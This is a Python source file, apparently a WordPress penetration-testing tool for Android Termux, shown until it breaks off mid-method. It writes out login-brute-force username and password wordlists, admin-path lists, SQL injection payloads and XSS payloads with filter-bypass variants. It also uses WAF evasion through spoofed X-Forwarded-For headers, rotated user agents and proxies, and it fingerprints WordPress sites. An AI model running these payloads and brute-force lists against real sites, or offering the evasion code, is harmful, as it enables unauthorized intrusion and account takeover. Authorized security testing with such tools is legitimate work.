#!/data/data/com.termux/files/usr/bin/python3
"""
WordPress Ultimate Security Tester v5.1 - Termux Edition
Enhanced for Android Termux with improved functionality
Advanced Security Scanner with Bypass Techniques
Created for comprehensive WordPress penetration testing
Optimized for Termux environment
"""

import requests
import urllib.parse
import re
import os
import sys
import json
import time
import threading
import random
import hashlib
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style, Back
import socket
import ssl
import ipaddress
import uuid
import html
import itertools
import argparse

# Check for required packages in Termux
def check_termux_packages():
    """Check if required packages are installed in Termux"""
    required_packages = ['python', 'openssl', 'curl']
    missing = []
    
    print(f"{Fore.YELLOW}[*] Checking Termux environment...{Style.RESET_ALL}")
    
    # Check for Termux specific paths
    termux_path = '/data/data/com.termux/files/usr'
    if not os.path.exists(termux_path):
        print(f"{Fore.YELLOW}[!] Not running in Termux environment{Style.RESET_ALL}")
        return
    
    # Check Python version
    python_version = sys.version_info
    if python_version.major < 3 or (python_version.major == 3 and python_version.minor < 7):
        print(f"{Fore.RED}[!] Python 3.7+ required. Current: {python_version.major}.{python_version.minor}{Style.RESET_ALL}")
        missing.append('python3.7+')
    
    # Check for colorama
    try:
        import colorama
    except ImportError:
        print(f"{Fore.YELLOW}[!] Installing missing package: colorama{Style.RESET_ALL}")
        os.system('pip install colorama')
    
    # Check for beautifulsoup4
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        print(f"{Fore.YELLOW}[!] Installing missing package: beautifulsoup4{Style.RESET_ALL}")
        os.system('pip install beautifulsoup4')
    
    if missing:
        print(f"{Fore.YELLOW}[!] Missing packages: {', '.join(missing)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Run: pkg install {' '.join(missing)}{Style.RESET_ALL}")

# Initialize colorama for Termux
try:
    colorama.init(autoreset=True)
except:
    # Fallback if colorama not available
    class DummyColors:
        def __getattr__(self, name):
            return ''
    Fore = Back = Style = DummyColors()

# Run package check
check_termux_packages()

class WordPressSecurityTester:
    def __init__(self, base_url, proxies=None, user_agent=None, delay=1.0, timeout=20):
        """
        Initialize WordPress Security Tester for Termux
        
        Args:
            base_url (str): Target WordPress site URL
            proxies (dict): Proxy configuration
            user_agent (str): Custom User-Agent
            delay (float): Delay between requests (higher for mobile)
            timeout (int): Request timeout (higher for mobile networks)
        """
        self.base_url = base_url.rstrip('/')
        self.proxies = proxies
        self.user_agent = user_agent or self.get_mobile_user_agent()
        self.delay = delay  # Increased delay for Termux/mobile
        self.timeout = timeout  # Increased timeout for mobile networks
        self.session = requests.Session()
        self.lock = threading.Lock()
        
        # Suppress SSL warnings for Termux
        try:
            requests.packages.urllib3.disable_warnings()
        except:
            pass
        
        # Termux specific optimizations
        self.termux_home = os.path.expanduser('~')
        self.is_termux = '/data/data/com.termux' in self.termux_home
        
        # WordPress paths
        self.wp_paths = {
            'login': '/wp-login.php',
            'admin': '/wp-admin/',
            'admin_post': '/wp-admin/admin-post.php',
            'admin_ajax': '/wp-admin/admin-ajax.php',
            'xmlrpc': '/xmlrpc.php',
            'rest_api': '/wp-json/wp/v2/',
            'rest_api_users': '/wp-json/wp/v2/users',
            'install': '/wp-admin/install.php',
            'upgrade': '/wp-admin/upgrade.php',
            'signup': '/wp-signup.php',
            'wp_cron': '/wp-cron.php',
            'trackback': '/wp-trackback.php',
            'load_scripts': '/wp-admin/load-scripts.php',
            'load_styles': '/wp-admin/load-styles.php',
            'config': '/wp-config.php',
            'admin_upgrade': '/wp-admin/upgrade.php?step=1'
        }
        
        # Results storage
        self.results = {
            "scan_info": {
                "target": self.base_url,
                "start_time": "",
                "end_time": "",
                "duration": 0,
                "environment": "Termux" if self.is_termux else "Desktop"
            },
            "wordpress_info": {
                "detected": False,
                "version": "",
                "plugins": [],
                "themes": [],
                "users": [],
                "valid_usernames": []
            },
            "security_tests": {
                "authentication_tests": [],
                "authorization_tests": [],
                "injection_tests": [],
                "information_disclosure": [],
                "misconfiguration_tests": [],
                "vulnerability_checks": []
            },
            "brute_force_results": {
                "attempts": 0,
                "successful_logins": [],
                "failed_logins": 0,
                "rate_limiting": False,
                "valid_usernames_found": [],
                "tested_combinations": []
            },
            "security_score": 0,
            "recommendations": [],
            "critical_issues": []
        }
        
        # Test counters
        self.stats = {
            "total_tests": 0,
            "passed": 0,
            "failed": 0,
            "warnings": 0,
            "critical": 0
        }
        
        # Wordlists
        self.username_list = []
        self.password_list = []
        self.proxy_list = []
        self.current_proxy_index = 0
        
        # Valid usernames found during testing
        self.valid_usernames = []
        
        # Advanced bypass techniques
        self.bypass_techniques = {
            'waf': [
                'Unicode Encoding',
                'Double Encoding',
                'Case Variation',
                'Null Byte Injection',
                'Overlong UTF-8',
                'HTML Entities',
                'Hex Encoding',
                'Octal Encoding'
            ],
            'sqli': [
                'Union Select Bypass',
                'Error Based Bypass',
                'Time Based Bypass',
                'Boolean Based Bypass',
                'Stacked Queries',
                'Out-of-Band'
            ],
            'xss': [
                'Event Handler Bypass',
                'JavaScript URI Bypass',
                'SVG XSS Bypass',
                'HTML5 Entity Bypass',
                'Unicode Bypass',
                'Template Injection'
            ]
        }
        
        # Output directories - Termux optimized
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.output_dir = os.path.join(self.termux_home, "wp_security_results")
        self.reports_dir = os.path.join(self.output_dir, "reports")
        self.wordlists_dir = os.path.join(self.output_dir, "wordlists")
        self.logs_dir = os.path.join(self.output_dir, "logs")
        self.found_dir = os.path.join(self.output_dir, "found_data")
        
        # Create directories
        for directory in [self.output_dir, self.reports_dir, self.wordlists_dir, self.logs_dir, self.found_dir]:
            try:
                os.makedirs(directory, exist_ok=True)
            except:
                pass
        
        # Create default wordlists if not exist
        self.create_advanced_wordlists()
        
        # Session configuration with mobile headers
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        })
        
        if self.proxies:
            self.session.proxies.update(self.proxies)
        
        # Rate limiting protection
        self.request_count = 0
        self.last_request_time = time.time()
        
        # Cookie jar for persistence
        self.cookies_file = os.path.join(self.found_dir, "cookies.json")
        
        print(f"{Fore.CYAN}[*] WordPress Ultimate Security Tester v5.1 - Termux Edition{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Target: {self.base_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] User Agent: {self.user_agent[:50]}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Output Directory: {self.output_dir}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Environment: {'Termux Android' if self.is_termux else 'Desktop'}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Advanced Bypass Techniques: {len(self.bypass_techniques['waf'])} WAF bypass methods{Style.RESET_ALL}")
    
    def get_mobile_user_agent(self):
        """Get mobile User-Agent for Termux"""
        user_agents = [
            # Mobile Chrome
            'Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
            
            # Mobile Firefox
            'Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
            
            # Mobile Safari
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            
            # Tablet Chrome
            'Mozilla/5.0 (Linux; Android 13; SM-X700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Safari/537.36',
            
            # Termux/Curl
            'Mozilla/5.0 (compatible; Termux-Security-Scanner/5.1; +http://github.com)',
            
            # Generic mobile
            'Mozilla/5.0 (Linux; Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0',
            
            # Samsung Browser
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36'
        ]
        return random.choice(user_agents)
    
    def create_advanced_wordlists(self):
        """Create advanced wordlists for testing in Termux"""
        print(f"{Fore.YELLOW}[*] Creating default wordlists...{Style.RESET_ALL}")
        
        # Advanced username list
        advanced_usernames = [
            # Default WordPress usernames
            'admin', 'administrator', 'wordpress', 'wpadmin', 
            'user', 'test', 'demo', 'owner',
            
            # Common variations
            'admin1', 'admin2', 'admin3', 'admin123',
            'administrator1', 'administrator123',
            'wpadmin1', 'wpadmin123',
            
            # Role-based usernames
            'editor', 'author', 'contributor', 'subscriber',
            'superadmin', 'superuser', 'root', 'sysadmin',
            'webmaster', 'webadmin', 'siteadmin', 'blogadmin',
            
            # Common patterns
            'user1', 'user2', 'user3', 'user123',
            'test1', 'test2', 'test3', 'test123',
            'demo1', 'demo2', 'demo3',
            
            # Company/Organization patterns
            'company', 'companyadmin', 'orgadmin',
            'web', 'webadmin', 'site', 'siteadmin',
            
            # Email patterns
            'admin@example.com', 'administrator@example.com',
            'webmaster@example.com', 'info@example.com',
            
            # Special characters
            'admin-user', 'admin.user', 'admin_user',
            'admin@123', 'admin#123', 'admin$123'
        ]
        
        username_file = os.path.join(self.wordlists_dir, "advanced_usernames.txt")
        if not os.path.exists(username_file):
            try:
                with open(username_file, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(advanced_usernames))
                print(f"{Fore.GREEN}[+] Created username list: {username_file}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error creating username list: {str(e)}{Style.RESET_ALL}")
        
        # Advanced password list
        advanced_passwords = [
            # Most common passwords
            'admin', 'password', '123456', '12345678', '123456789',
            'admin123', 'password123', '1234567890',
            
            # WordPress specific
            'wordpress', 'WordPress', 'wordpress123', 'WordPress123',
            'wpadmin', 'wpadmin123', 'wppassword',
            
            # Year based
            '2024', '2023', '2022', '2021', '2020',
            '2024!', '2023!', '2022!',
            
            # Common patterns
            'qwerty', 'qwerty123', 'qwertyuiop',
            'asdfgh', 'asdfgh123', 'asdfghjkl',
            'zxcvbn', 'zxcvbn123', 'zxcvbnm',
            
            # Name based
            'letmein', 'welcome', 'monkey', 'dragon',
            'baseball', 'football', 'sunshine', 'master',
            'hello', 'trustno1', 'superman',
            
            # Keyboard patterns
            '1qaz2wsx', '1q2w3e4r', '1q2w3e4r5t',
            '!qaz2wsx', '!qaz@wsx', 'zaq12wsx',
            
            # Advanced patterns
            'P@ssw0rd', 'P@ssword123', 'Passw0rd!',
            'Admin@123', 'Admin#2024', 'Admin$123',
            'Wordpress@123', 'Wp@2024', 'Site@123',
            
            # Special character patterns
            '123!@#', '123@#$', '123#$%',
            '!@#$%^', '!@#$%^&', '!@#$%^&*',
            
            # Number sequences
            '111111', '222222', '333333', '444444',
            '555555', '666666', '777777', '888888',
            '999999', '000000',
            
            # Repeated patterns
            'aaaaaa', 'bbbbbb', 'cccccc', 'dddddd',
            'abcdef', 'abc123', 'abc@123',
            
            # Short but common
            'pass', 'pass1', 'pass123',
            'admin1', 'admin12', 'admin1234'
        ]
        
        password_file = os.path.join(self.wordlists_dir, "advanced_passwords.txt")
        if not os.path.exists(password_file):
            try:
                with open(password_file, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(advanced_passwords))
                print(f"{Fore.GREEN}[+] Created password list: {password_file}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error creating password list: {str(e)}{Style.RESET_ALL}")
        
        # Admin paths for directory brute force
        admin_paths = [
            # WordPress default
            '/wp-admin/', '/wp-login.php', '/wp-admin/admin.php',
            '/wp-admin/index.php', '/wp-admin/install.php',
            
            # Common alternatives
            '/admin/', '/administrator/', '/login/', '/dashboard/',
            '/controlpanel/', '/adminpanel/', '/cp/', '/panel/',
            '/backend/', '/user/', '/account/', '/signin/', '/member/',
            
            # Language variations
            '/administracion/', '/administration/', '/verwalten/',
            '/beheer/', '/hallinta/', '/gestao/', '/gestione/',
            
            # Subdirectories
            '/admin/index.php', '/admin/login.php', '/admin/admin.php',
            '/administrator/index.php', '/administrator/login.php',
            '/user/login.php', '/user/admin.php',
            
            # Common files
            '/admin_area/', '/admin1/', '/admin2/', '/admin3/',
            '/admin4/', '/admin5/', '/usuarios/', '/usuario/',
            
            # Backup files
            '/admin.bak', '/admin.php.bak', '/admin.php.save',
            '/admin.php.old', '/admin.php.backup',
        ]
        
        paths_file = os.path.join(self.wordlists_dir, "admin_paths.txt")
        if not os.path.exists(paths_file):
            try:
                with open(paths_file, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(admin_paths))
                print(f"{Fore.GREEN}[+] Created paths list: {paths_file}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error creating paths list: {str(e)}{Style.RESET_ALL}")
        
        # SQL injection payloads
        sqli_payloads = [
            # Basic SQLi
            "'", '"', "`",
            "'--", '"--', "`--",
            "' OR '1'='1", '" OR "1"="1",
            "' OR 1=1--", '" OR 1=1--',
            "' OR 1=1#", '" OR 1=1#',
            
            # Union based
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT 1,2,3--", "' UNION SELECT @@version--",
            
            # Error based
            "' AND ExtractValue(1,CONCAT(0x7e,version()))--",
            "' AND UpdateXML(1,CONCAT(0x7e,version()),1)--",
            
            # Time based
            "' AND SLEEP(5)--", "' OR SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # Blind boolean
            "' AND 1=1--", "' AND 1=2--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
        ]
        
        sqli_file = os.path.join(self.wordlists_dir, "sqli_payloads.txt")
        if not os.path.exists(sqli_file):
            try:
                with open(sqli_file, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(sqli_payloads))
                print(f"{Fore.GREEN}[+] Created SQLi payloads: {sqli_file}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error creating SQLi payloads: {str(e)}{Style.RESET_ALL}")
        
        # XSS payloads
        xss_payloads = [
            # Basic XSS
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg/onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            
            # Event handlers
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            
            # JavaScript URI
            'javascript:alert(1)',
            'javascript:alert(document.domain)',
            'JaVaScRiPt:alert(1)',
            
            # Data URI
            'data:text/html,<script>alert(1)</script>',
            
            # SVG payloads
            '<svg><script>alert(1)</script></svg>',
            '<svg><g onload="alert(1)"></g></svg>',
            
            # Bypass techniques
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<<script>script>alert(1)</script>',
            '<img src="x" onerror="alert`1`">',
        ]
        
        xss_file = os.path.join(self.wordlists_dir, "xss_payloads.txt")
        if not os.path.exists(xss_file):
            try:
                with open(xss_file, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(xss_payloads))
                print(f"{Fore.GREEN}[+] Created XSS payloads: {xss_file}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error creating XSS payloads: {str(e)}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] Default wordlists created in: {self.wordlists_dir}{Style.RESET_ALL}")
    
    def print_banner(self):
        """Display tool banner for Termux"""
        banner = f"""
{Fore.CYAN}{'='*80}
╔╦╗┬ ┬┌─┐┬─┐┌─┐┌─┐┬ ┬  ╦ ╦┌─┐┬─┐┌─┐┌┬┐┌─┐  ╔═╗┌─┐┌┬┐┌─┐┬─┐┌┬┐┌─┐┬─┐
 ║ ├─┤├─┤├┬┘│  ├─┤└┬┘  ║ ║├─┤├┬┘├─┤ │ ├┤ ├┬┘  ╚═╗│  ├┬┘├─┤│   │ ││ ││││
 ╩ ┴ ┴┴ ┴┴└─└─┘┴ ┴ ┴   ╚═╝┴ ┴┴└─┴ ┴ ┴ └─┘┴└─  ╚═╝└─┘┴└─┴ ┴┴─┘ ┴ ┴└─┘┘└┘
{'='*80}
{Fore.YELLOW}WordPress Ultimate Security Tester v5.1 | Termux Android Edition
{Fore.GREEN}Enhanced with Advanced Bypass Techniques and Comprehensive Testing
{Fore.CYAN}Created for Authorized Security Testing Only
{'='*80}{Style.RESET_ALL}
        """
        print(banner)
    
    def print_test_header(self, test_name, description=""):
        """Print test header with styling"""
        print(f"\n{Fore.CYAN}{'━'*80}")
        print(f"🔍 {Fore.WHITE}{test_name}")
        if description:
            print(f"{Fore.YELLOW}   {description}")
        print(f"{Fore.CYAN}{'━'*80}{Style.RESET_ALL}")
    
    def print_payload_result(self, payload_type, payload, status, details=""):
        """Print payload test result with verification"""
        status_icons = {
            "SUCCESS": "✅",
            "FAILED": "❌",
            "WORKING": "⚡",
            "VULNERABLE": "🔥",
            "PROTECTED": "🛡️"
        }
        
        status_colors = {
            "SUCCESS": Fore.GREEN,
            "FAILED": Fore.RED,
            "WORKING": Fore.YELLOW,
            "VULNERABLE": Fore.RED,
            "PROTECTED": Fore.YELLOW
        }
        
        icon = status_icons.get(status, "•")
        color = status_colors.get(status, Fore.WHITE)
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        result_line = f"{Fore.WHITE}[{timestamp}] {color}{icon} {payload_type} Payload Test: {status}"
        
        if payload:
            result_line += f"\n   {Fore.CYAN}Payload: {payload[:100]}{Style.RESET_ALL}"
        
        if details:
            result_line += f"\n   {Fore.WHITE}Details: {details}{Style.RESET_ALL}"
        
        print(result_line)
    
    def print_result(self, level, message, url="", details=""):
        """
        Print test result with color coding
        
        Args:
            level (str): SUCCESS, WARNING, FAILED, CRITICAL, INFO
            message (str): Result message
            url (str): Test URL
            details (str): Additional details
        """
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        colors = {
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "FAILED": Fore.RED,
            "CRITICAL": Fore.RED + Style.BRIGHT,
            "INFO": Fore.BLUE
        }
        
        symbols = {
            "SUCCESS": "✅",
            "WARNING": "⚠️",
            "FAILED": "❌",
            "CRITICAL": "🔥",
            "INFO": "ℹ️"
        }
        
        color = colors.get(level, Fore.WHITE)
        symbol = symbols.get(level, "•")
        
        # Update statistics
        with self.lock:
            self.stats["total_tests"] += 1
            if level == "SUCCESS":
                self.stats["passed"] += 1
            elif level == "WARNING":
                self.stats["warnings"] += 1
            elif level == "FAILED":
                self.stats["failed"] += 1
            elif level == "CRITICAL":
                self.stats["critical"] += 1
        
        # Format output
        result_line = f"{Fore.WHITE}[{timestamp}] {color}{symbol} {message}{Style.RESET_ALL}"
        
        if url:
            result_line += f"\n   {Fore.CYAN}📎 URL: {url}{Style.RESET_ALL}"
        
        if details:
            result_line += f"\n   {Fore.WHITE}📝 {details}{Style.RESET_ALL}"
        
        print(result_line)
        
        # Log to file
        self.log_to_file(level, message, url, details)
    
    def log_to_file(self, level, message, url="", details=""):
        """Log result to file in Termux"""
        log_file = os.path.join(self.logs_dir, f"scan_{datetime.now().strftime('%Y%m%d')}.log")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            with open(log_file, 'a', encoding='utf-8') as f:
                log_entry = f"[{timestamp}] [{level}] {message}"
                if url:
                    log_entry += f" | URL: {url}"
                if details:
                    log_entry += f" | Details: {details}"
                f.write(log_entry + "\n")
        except Exception as e:
            print(f"{Fore.RED}[!] Error logging to file: {str(e)}{Style.RESET_ALL}")
    
    def advanced_request(self, url, method="GET", data=None, params=None, headers=None, 
                        cookies=None, allow_redirects=False, timeout=None, 
                        bypass_waf=False, retry_count=3, verify_ssl=False):
        """
        Advanced HTTP request optimized for Termux
        
        Args:
            url (str): Target URL
            method (str): HTTP method
            data (dict): POST data
            params (dict): URL parameters
            headers (dict): Custom headers
            cookies (dict): Cookies
            allow_redirects (bool): Follow redirects
            timeout (int): Request timeout
            bypass_waf (bool): Use WAF bypass techniques
            retry_count (int): Number of retry attempts
            verify_ssl (bool): Verify SSL certificates
            
        Returns:
            Response object or None
        """
        # Rate limiting with jitter for mobile networks
        current_time = time.time()
        time_since_last = current_time - self.last_request_time
        
        if time_since_last < self.delay:
            sleep_time = self.delay - time_since_last + random.uniform(0, 0.3)  # Increased jitter for mobile
            time.sleep(sleep_time)
        
        self.last_request_time = time.time()
        self.request_count += 1
        
        # Prepare request with mobile headers
        req_headers = self.session.headers.copy()
        
        # Add custom headers if provided
        if headers:
            req_headers.update(headers)
        
        # WAF bypass for mobile
        if bypass_waf:
            # Use mobile User-Agent
            req_headers['User-Agent'] = self.get_mobile_user_agent()
            
            # Add mobile-specific headers
            mobile_headers = {
                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                'X-Wap-Profile': 'http://wap.samsungmobile.com/uaprof/SM-G991B.xml',
                'X-OperaMini-Phone-UA': 'iPhone; CPU iPhone OS 17_2 like Mac OS X',
                'X-Requested-With': 'XMLHttpRequest',
                'X-Forwarded-Proto': 'https',
                'X-Forwarded-Port': '443',
            }
            
            req_headers.update(mobile_headers)
        
        if timeout is None:
            timeout = self.timeout
        
        # Retry logic optimized for mobile networks
        for attempt in range(retry_count):
            try:
                # Rotate proxy if available
                if self.proxy_list and attempt > 0:
                    self.session.proxies.update(self.rotate_proxy())
                
                # Disable SSL verification for Termux compatibility
                verify = verify_ssl
                
                if method.upper() == "POST":
                    response = self.session.post(
                        url,
                        data=data,
                        params=params,
                        headers=req_headers,
                        cookies=cookies,
                        allow_redirects=allow_redirects,
                        timeout=timeout,
                        verify=verify,
                        proxies=self.proxies
                    )
                elif method.upper() == "PUT":
                    response = self.session.put(
                        url,
                        data=data,
                        headers=req_headers,
                        cookies=cookies,
                        allow_redirects=allow_redirects,
                        timeout=timeout,
                        verify=verify,
                        proxies=self.proxies
                    )
                elif method.upper() == "DELETE":
                    response = self.session.delete(
                        url,
                        headers=req_headers,
                        cookies=cookies,
                        allow_redirects=allow_redirects,
                        timeout=timeout,
                        verify=verify,
                        proxies=self.proxies
                    )
                else:
                    response = self.session.get(
                        url,
                        params=params,
                        headers=req_headers,
                        cookies=cookies,
                        allow_redirects=allow_redirects,
                        timeout=timeout,
                        verify=verify,
                        proxies=self.proxies
                    )
                
                # Check for Cloudflare/WAF challenges
                if response.status_code == 403:
                    if 'cloudflare' in response.text.lower() or 'waf' in response.text.lower():
                        self.print_result("WARNING", f"WAF/Cloudflare detected (attempt {attempt + 1})", url)
                        if attempt < retry_count - 1:
                            time.sleep(3)  # Increased wait for mobile
                            continue
                
                # Check for rate limiting
                if response.status_code == 429:
                    self.print_result("WARNING", f"Rate limited (attempt {attempt + 1})", url)
                    if attempt < retry_count - 1:
                        wait_time = (attempt + 1) * 10  # Longer backoff for mobile
                        time.sleep(wait_time)
                        continue
                
                # Check for mobile-specific blocks
                if response.status_code == 503 and 'mobile' in response.text.lower():
                    self.print_result("WARNING", f"Mobile access blocked (attempt {attempt + 1})", url)
                    if attempt < retry_count - 1:
                        time.sleep(5)
                        continue
                
                return response
                
            except requests.exceptions.Timeout:
                if attempt < retry_count - 1:
                    self.print_result("WARNING", f"Request timeout, retrying... (attempt {attempt + 1})", url)
                    time.sleep(2)  # Longer wait for mobile
                    continue
                else:
                    self.print_result("WARNING", f"Request timeout after {retry_count} attempts", url)
                    return None
                    
            except requests.exceptions.ConnectionError:
                if attempt < retry_count - 1:
                    self.print_result("WARNING", f"Connection error, retrying... (attempt {attempt + 1})", url)
                    time.sleep(3)  # Longer wait for mobile
                    continue
                else:
                    self.print_result("WARNING", f"Connection error after {retry_count} attempts", url)
                    return None
                    
            except requests.exceptions.TooManyRedirects:
                self.print_result("WARNING", "Too many redirects", url)
                return None
                
            except Exception as e:
                if attempt < retry_count - 1:
                    self.print_result("WARNING", f"Request error: {str(e)[:50]}, retrying...", url)
                    time.sleep(2)
                    continue
                else:
                    self.print_result("WARNING", f"Request error after {retry_count} attempts: {str(e)[:50]}", url)
                    return None
        
        return None
    
    def detect_wordpress(self):
        """Advanced WordPress detection with multiple techniques for Termux"""
        self.print_test_header("WordPress Detection", "Advanced WordPress detection with multiple techniques")
        
        wp_indicators = [
            # HTML indicators
            ('/wp-content/', 'wp-content directory'),
            ('/wp-includes/', 'wp-includes directory'),
            ('wp-json', 'REST API endpoint'),
            ('wp-admin', 'Admin interface'),
            ('WordPress', 'WordPress generator tag'),
            ('wp-embed.min.js', 'WordPress embed script'),
            ('wp-emoji-release.min.js', 'WordPress emoji script'),
            ('xmlrpc.php', 'XML-RPC endpoint'),
            
            # Meta tags
            ('<meta name="generator" content="WordPress', 'WordPress generator meta'),
            ('content="WordPress"', 'WordPress content'),
        ]
        
        response = self.advanced_request(self.base_url, bypass_waf=True)
        wp_detected = False
        detection_details = []
        
        if response:
            content = response.text.lower()
            
            for indicator, description in wp_indicators:
                if indicator.lower() in content:
                    detection_details.append(description)
                    wp_detected = True
            
            # Check WordPress version with multiple techniques
            version = self.extract_wordpress_version_advanced(response.text)
            if version:
                self.results["wordpress_info"]["version"] = version
                self.print_result("INFO", f"WordPress version detected: {version}", 
                                self.base_url, "Version extracted from HTML")
        
        # Check common WordPress files with payload verification
        wp_files_to_check = [
            ('/wp-login.php', 'Login page'),
            ('/readme.html', 'Readme file'),
            ('/license.txt', 'License file'),
            ('/wp-signup.php', 'Signup page'),
            ('/wp-cron.php', 'Cron endpoint'),
            ('/wp-trackback.php', 'Trackback endpoint'),
            ('/wp-links-opml.php', 'OPML links'),
            ('/wp-load.php', 'Core loader'),
            ('/wp-config-sample.php', 'Config sample'),
            ('/wp-mail.php', 'Mail script')
        ]
        
        for wp_file, file_desc in wp_files_to_check:
            file_url = self.base_url + wp_file
            file_response = self.advanced_request(file_url, bypass_waf=True)
            
            if file_response:
                if file_response.status_code == 200:
                    self.print_payload_result("File Detection", wp_file, "WORKING", 
                                            f"{file_desc} accessible")
                    wp_detected = True
                    detection_details.append(f"File: {wp_file}")
                
                # Check for specific headers
                if 'server' in file_response.headers:
                    server = file_response.headers['server']
                    if 'wordpress' in server.lower() or 'wp' in server.lower():
                        self.print_result("INFO", f"WordPress server header: {server}", file_url)
                        wp_detected = True
        
        # Check for WordPress APIs with payload verification
        api_endpoints = [
            ('/wp-json/', 'REST API'),
            ('/xmlrpc.php', 'XML-RPC API'),
            ('/wp-admin/admin-ajax.php', 'AJAX endpoint')
        ]
        
        for api_endpoint, api_desc in api_endpoints:
            api_url = self.base_url + api_endpoint
            api_response = self.advanced_request(api_url, bypass_waf=True)
            
            if api_response:
                if api_response.status_code == 200:
                    response_text = api_response.text.lower()
                    if 'wordpress' in response_text or 'wp' in response_text or 'rest' in response_text:
                        self.print_payload_result("API Detection", api_endpoint, "WORKING", 
                                                f"{api_desc} endpoint active")
                        wp_detected = True
                        detection_details.append(f"API: {api_endpoint}")
                elif api_response.status_code == 403:
                    self.print_payload_result("API Detection", api_endpoint, "PROTECTED", 
                                            f"{api_desc} endpoint protected")
                elif api_response.status_code == 404:
                    self.print_payload_result("API Detection", api_endpoint, "FAILED", 
                                            f"{api_desc} endpoint not found")
        
        if wp_detected:
            self.results["wordpress_info"]["detected"] = True
            self.print_result("SUCCESS", "WordPress successfully detected", self.base_url,
                            f"Indicators found: {', '.join(detection_details[:5])}")
            
            # Save WordPress info to file
            self.save_wordpress_info()
            return True
        else:
            self.print_result("WARNING", "WordPress not detected or indicators hidden", 
                            self.base_url, "Site may be using security through obscurity")
            return False
    
    def extract_wordpress_version_advanced(self, html):
        """Extract WordPress version using multiple techniques"""
        patterns = [
            # Meta generator tag (most common)
            r'<meta name="generator" content="WordPress (\d+\.\d+(?:\.\d+)?)"',
            r'content="WordPress (\d+\.\d+(?:\.\d+)?)"',
            
            # Readme file version
            r'Version (\d+\.\d+(?:\.\d+)?)',
            
            # Script versions
            r'wp-embed\.js\?ver=(\d+\.\d+(?:\.\d+)?)',
            r'wp-includes/js/wp-embed\.min\.js\?ver=(\d+\.\d+(?:\.\d+)?)',
            r'ver=(\d+\.\d+(?:\.\d+)?)',
            
            # CSS versions
            r'wp-includes/css/.*?ver=(\d+\.\d+(?:\.\d+)?)',
            
            # Admin page version
            r'WordPress (\d+\.\d+(?:\.\d+)?)',
            
            # RSS feed version
            r'<generator>https://wordpress.org/\?v=(\d+\.\d+(?:\.\d+)?)</generator>',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                version = match.group(1)
                # Validate version format
                if re.match(r'^\d+\.\d+(?:\.\d+)?$', version):
                    self.print_payload_result("Version Detection", version, "SUCCESS", 
                                            f"Extracted using pattern: {pattern[:50]}...")
                    return version
        
        return None
    
    def save_wordpress_info(self):
        """Save WordPress information to file"""
        if not self.results["wordpress_info"]["detected"]:
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        info_file = os.path.join(self.found_dir, f"wordpress_info_{timestamp}.txt")
        
        try:
            with open(info_file, 'w', encoding='utf-8') as f:
                f.write("WordPress Information\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Target URL: {self.base_url}\n")
                f.write(f"Detection Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
